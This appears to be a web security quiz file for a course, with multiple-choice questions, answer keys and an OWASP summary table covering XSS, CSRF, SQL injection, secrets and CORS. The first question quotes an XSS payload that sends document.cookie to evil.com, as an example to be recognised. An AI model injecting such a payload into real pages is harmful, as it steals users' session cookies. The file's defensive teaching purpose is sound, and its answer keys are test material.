---
slug: auth-web-security-quiz
title: "Checkpoint: Web Vulnerabilities"
type: quiz
xp: 20
questions:
  - prompt: "A comment containing `<script>fetch('//evil.com?c='+document.cookie)</script>` runs in other users' browsers. What is this?"
    options: ["SQL injection", "Cross-Site Scripting (XSS)", "CSRF"]
    answer: 1
  - prompt: "Why does React mostly protect you from XSS?"
    options: ["It escapes values rendered in JSX by default", "It blocks all scripts", "It sanitises your database"]
    answer: 0
    explanation: "`dangerouslySetInnerHTML` bypasses this, so treat it as a red flag."
  - prompt: "An evil site auto-submits a form to your-bank.com/transfer using the victim's cookies. What is this, and what's a key defence?"
    options: ["XSS — escape output", "CSRF — SameSite cookies and CSRF tokens", "DDoS — rate limiting"]
    answer: 1
  - prompt: "What's the fix for SQL injection?"
    options: ["Strip quotes from input", "Parameterised queries / an ORM", "Hide your table names"]
    answer: 1
  - prompt: "Where should secrets like JWT_SECRET and DATABASE_URL live?"
    options: ["Hard-coded in the source", "Environment variables, never committed to git", "In the frontend bundle"]
    answer: 1
  - prompt: "What does setting `Access-Control-Allow-Origin: *` on an API that uses cookies risk?"
    options: ["Nothing", "Browsers refuse to send credentials with a wildcard. Reflecting the request origin with credentials enabled lets any site make authenticated requests", "It disables HTTPS"]
    answer: 1
  - prompt: "Which middleware sets safe HTTP security headers in Express?"
    options: ["helmet", "cors", "morgan"]
    answer: 0
resources: [{"title": "OWASP Top 10", "url": "https://owasp.org/www-project-top-ten/"}]
---
# Checkpoint: Web Vulnerabilities

The [OWASP Top 10](https://owasp.org/www-project-top-ten/) lists the most critical web risks. The essentials for a CRUD app:

| Attack | What happens | Defence |
|--------|-------------|---------|
| **SQL injection** | User input runs as SQL | Parameterised queries / ORM |
| **XSS** | User input runs as JavaScript in other users' browsers | Escape output (React does by default), CSP headers |
| **CSRF** | Another site makes requests using your cookies | `SameSite` cookies, CSRF tokens |
| **Broken access control** | Users access others' data | Check ownership on *every* query |
| **Secrets exposure** | Keys committed to git | Env vars, `.gitignore`, secret scanning |
| **Brute force** | Password guessing | Rate limiting, slow hashing |

Answer every question correctly to earn the XP.
